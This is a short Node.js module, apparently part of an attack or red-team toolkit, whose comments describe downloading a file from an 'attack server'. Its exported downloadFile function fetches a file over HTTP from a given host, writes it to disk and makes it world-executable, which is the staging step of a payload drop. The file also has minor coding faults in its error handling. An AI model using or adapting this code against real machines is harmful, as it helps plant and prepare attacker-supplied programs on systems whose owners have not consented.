"use strict"

const http = require("http")
const fs = require("fs");

// Begin logic for downloading a file from the attack server
function getPromise(url) {
    return new Promise((resolve, reject) => {
	http.get(url, (response) => {
	    let chunks_of_data = [];

	    response.on('data', (fragments) => {
		chunks_of_data.push(fragments);
	    });

	    response.on('end', () => {
		let response_body = Buffer.concat(chunks_of_data);
		resolve(response_body.toString());
	    });

	    response.on('error', (error) => {
		reject(error);
	    });
	});
    });
}

async function downloadFile(server, file) {
    try {
	console.log('Start of downloadFile');
	var url = 'http://' + server + '/' + file;
	console.log('URL: ' + url);

	let http_promise = getPromise(url);
	let response_body = await http_promise;

	fs.writeFileSync(file, response_body, (err) => {
	    if (err) throw err;
	});

	console.log('Script downloaded.');

	console.log(response_body);

	console.log('Making script executable');

	fs.chmod(file, 0o777, err => {
	    if (err) throw err;
	});

	console.log('Script permissions changed.');

	return 'Script successfully downloaded to ' + file;
    } catch (error) {
	console.log(error);
	return 'Error downloading script. Error: ' + error;
    }
}
// End logic for downloading a file from the attack server

module.exports = {downloadFile}
